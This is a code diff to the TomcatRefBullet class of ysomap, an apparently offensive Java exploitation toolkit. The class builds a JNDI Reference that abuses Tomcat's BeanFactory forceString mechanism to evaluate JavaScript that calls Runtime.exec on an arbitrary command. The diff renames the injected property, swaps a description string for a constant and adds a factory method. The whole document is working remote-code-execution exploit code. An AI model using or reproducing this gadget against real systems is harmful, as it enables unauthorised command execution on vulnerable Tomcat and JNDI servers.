@@ -3,6 +3,7 @@ package ysomap.bullets.jdk.rmi;
 import org.apache.naming.ResourceRef;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
+import ysomap.core.util.DetailHelper;
 
 import javax.naming.Reference;
 import javax.naming.StringRefAddr;
@@ -19,7 +20,7 @@ import javax.naming.StringRefAddr;
 public class TomcatRefBullet implements Bullet<Reference> {
 
     @NotNull
-    @Require(name = "command", detail = "system command to execute")
+    @Require(name = "command", detail = DetailHelper.COMMAND)
     private String command;
 
     @Override
@@ -29,11 +30,17 @@ public class TomcatRefBullet implements Bullet<Reference> {
                 null, "", "",
                 true,"org.apache.naming.factory.BeanFactory",
                 null);
-        ref.add(new StringRefAddr("forceString", "KINGX=eval"));
-        ref.add(new StringRefAddr("KINGX",
+        ref.add(new StringRefAddr("forceString", "x=eval"));
+        ref.add(new StringRefAddr("x",
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                         ".newInstance().getEngineByName(\"JavaScript\")" +
                         ".eval(\"java.lang.Runtime.getRuntime().exec('"+command+"')\")"));
         return ref;
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        Bullet bullet = new TomcatRefBullet();
+        bullet.set("command", args[0]);
+        return bullet;
     }
 }
